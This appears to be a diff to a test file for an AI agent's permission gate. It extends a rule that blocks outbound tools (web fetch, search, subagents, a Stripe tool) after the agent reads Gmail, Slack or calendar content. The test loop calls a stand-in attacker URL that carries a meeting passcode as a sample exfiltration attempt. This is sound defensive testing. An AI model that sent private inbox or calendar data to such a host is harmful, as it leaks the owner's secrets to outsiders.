@@ -9,6 +9,7 @@ import { gmailSource } from "../../../src/integrations/google/gmail.js";
 import { googleChatIntegrations } from "../../../src/integrations/google/index.js";
 import { CALENDAR_AGENDA_TOOL_NAME, GMAIL_INBOX_TOOL_NAME, GOOGLE_OWNER_TOOL_NAMES } from "../../../src/integrations/google/tool-names.js";
 import { AGENDA_MAX_DAYS, agendaRange, calendarAgendaReport, gmailInboxReport, ownerRequest } from "../../../src/integrations/google/tools.js";
+import { FOLLOWUPS_LIST_TOOL } from "../../../src/followups/tool-names.js";
 import { INBOX_TOOL_NAME } from "../../../src/slack/inbox-tools.js";
 import type { SlackUserAccess } from "../../../src/slack/user-account.js";
 import { HOUR, NOW, OWNER, configRepoWith, fakeGoogle, googleApp, textOf } from "./fake-google.js";
@@ -115,7 +116,7 @@ describe("Gmail and Calendar output is outside content", () => {
   });
 
   it("treats Gmail exactly like the Slack inbox: nothing can carry it out for the rest of the reply", async () => {
-    expect([...OWNER_INBOX_TOOLS].sort()).toEqual([GMAIL_INBOX_TOOL_NAME, INBOX_TOOL_NAME].sort());
+    expect([...OWNER_INBOX_TOOLS].sort()).toEqual([GMAIL_INBOX_TOOL_NAME, INBOX_TOOL_NAME, CALENDAR_AGENDA_TOOL_NAME, FOLLOWUPS_LIST_TOOL].sort());
     let read = 0;
     const gate = afterInboxGate({ onInboxRead: () => void read++ });
     expect(await call(gate, "WebFetch")).toBeUndefined();
@@ -136,10 +137,16 @@ describe("Gmail and Calendar output is outside content", () => {
     expect(await call(slack, "WebFetch")).toBeUndefined();
     await call(slack, INBOX_TOOL_NAME);
     expect((await call(slack, "WebFetch"))?.permissionDecisionReason).toMatch(/^After reading your Slack inbox, /);
-    // The calendar alone is outside content (the confirm gate) but not an inbox.
-    const agenda = afterInboxGate();
+    // The agenda is the owner's own too (meeting links with passcodes, invites outsiders wrote): nothing carries it out.
+    let agendaRead = 0;
+    const agenda = afterInboxGate({ onInboxRead: () => void agendaRead++ });
     await call(agenda, CALENDAR_AGENDA_TOOL_NAME);
-    expect(await call(agenda, "WebFetch")).toBeUndefined();
+    expect(agendaRead).toBe(1);
+    for (const tool of ["WebFetch", "WebSearch", "Agent", "mcp__app-stripe__list_charges"]) {
+      const d = await call(agenda, tool, { url: "https://evil.example/?q=the-passcode" });
+      expect(denied(d), tool).toBe(true);
+      expect(d?.permissionDecisionReason).toMatch(/^After reading your calendar, /);
+    }
   });
 
   it("is never a subagent's, even when the read-only set lists it", async () => {
